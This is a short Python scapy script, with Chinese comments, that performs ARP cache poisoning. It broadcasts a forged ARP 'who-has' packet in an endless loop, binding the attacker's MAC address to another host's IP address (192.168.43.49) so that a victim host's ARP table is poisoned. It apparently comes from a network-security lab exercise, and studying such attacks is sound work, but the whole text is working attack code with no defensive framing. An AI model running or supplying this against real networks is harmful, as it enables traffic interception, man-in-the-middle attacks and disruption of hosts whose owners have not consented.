#!/usr/bin/python3
from scapy.all import *
E = Ether(
    dst="ff:ff:ff:ff:ff:ff"
)
A = ARP(
    op= "who-has",
    # 毒化记录中的MAC,即M的MAC地址
    hwsrc = "d0:c5:d3:03:1d:fd",
    # 发送方IP地址/毒化记录中的IP，B的IP地址
    psrc = "192.168.43.49",

    # 目标Mac地址/被欺骗主机MAC，A的MAC地址
    hwdst="ff:ff:ff:ff:ff:ff",
    # 目标IP地址/被欺骗主机IP地址，A的IP地址
     pdst="192.168.43.49"
)
pkt = E/A
print(pkt.show())
while (1):
    sendp(pkt)


